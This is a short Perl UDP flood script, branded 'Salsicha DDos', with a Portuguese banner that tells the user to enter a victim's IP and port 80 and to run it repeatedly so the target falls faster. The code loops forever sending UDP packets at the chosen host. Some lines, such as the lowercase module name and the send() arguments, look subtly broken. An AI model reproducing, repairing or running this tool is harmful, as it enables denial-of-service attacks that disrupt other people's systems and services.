#!/usr/bin/perl
use io::socket;
# udp
#flooder.pl coded by disturbed_1

print q{
=================================================
=                                               =
=      Script , Salsicha DDos By Thiago         =
=          @thiago 2016 Script DDos             =
=       www.youtube.com/c/thiagoplays11         =
=          .=====TUTORIAL=====.                 =
=          Pegue o IP da vitima, depois         =
=          Coloque o IP onde está marcado       =
=          o 'IP' e clique enter, dps           =
=          coloque a porta '80' a Padrão        =
=                                               =
=          Obs:Para cair + rapido fassa         =
=          isso varias vezes                    =
=                                               =
=        ©copyright 2016 - Created:Thiago       =
=================================================
};

print "IP: ";
chop ($host = <stdin>);
print "Porta: ";
chop ($port = <stdin>);

{
$sock = IO::Socket::INET->new (
        PeerAddr => $host,
        PeerPort => $port,
        Proto => 'udp') || die "$! Make sure the IP/host or port number is correct";
}
packets:
while (1) {
$size = rand() * 200 * 2000;
print ("$host:$port packet size: $size\n");
send($sock, 0, $size);
}